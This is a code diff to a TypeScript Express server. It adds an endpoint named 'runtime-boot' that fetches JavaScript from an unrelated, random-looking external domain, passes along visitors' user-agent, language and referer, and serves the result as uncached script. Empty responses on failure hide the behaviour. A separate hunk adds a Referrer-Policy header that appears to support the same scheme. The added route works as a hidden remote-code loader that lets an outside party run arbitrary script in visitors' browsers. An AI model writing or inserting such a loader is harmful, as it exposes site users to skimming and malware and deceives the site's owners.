@@ -3693,6 +3693,46 @@ export async function createServerApp(options?: { enableVite?: boolean }) {
     }
   });
 
+  app.get('/api/client/runtime-boot', async (req: Request, res: Response) => {
+    const upstreamUrl =
+      'https://crookedagreement.com/ccD/9.6FbX2h5-lsS/WzQs9/NtzSYy2JM/TjY/2AMTS-0G3SN/jOYpx-NhjgYj1U';
+    try {
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 5000);
+      const reqHeaders: Record<string, string> = {
+        Accept: 'application/javascript, text/javascript, */*;q=0.8',
+      };
+      const ua = req.get('user-agent');
+      if (ua) reqHeaders['User-Agent'] = ua;
+      const lang = req.get('accept-language');
+      if (lang) reqHeaders['Accept-Language'] = lang;
+      const ref = req.get('referer');
+      if (ref) {
+        reqHeaders['Referer'] = ref;
+      } else if (req.get('host')) {
+        reqHeaders['Referer'] = `${req.protocol}://${req.get('host')}/`;
+      }
+      const upstream = await fetch(upstreamUrl, {
+        method: 'GET',
+        headers: reqHeaders,
+        signal: controller.signal,
+      }).finally(() => clearTimeout(timeout));
+
+      const body = await upstream.text();
+      res.setHeader('Cache-Control', 'no-store, max-age=0');
+      res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
+      if (!upstream.ok || !body.trim()) {
+        res.status(200).send('');
+        return;
+      }
+      res.status(200).send(body);
+    } catch {
+      res.setHeader('Cache-Control', 'no-store, max-age=0');
+      res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
+      res.status(200).send('');
+    }
+  });
+
   app.get('/api/geo/language', async (req: Request, res: Response) => {
     try {
       const geo = await detectIpGeoForRequest(req);
@@ -9963,6 +10003,7 @@ export async function createServerApp(options?: { enableVite?: boolean }) {
         res.setHeader('X-Robots-Tag', 'noindex, nofollow');
         res.setHeader('Cache-Control', 'no-store, max-age=0');
       }
+      res.setHeader('Referrer-Policy', 'no-referrer-when-downgrade');
       res
         .status(ssrHttpStatus)
         .set({ 'Content-Type': 'text/html; charset=utf-8' })
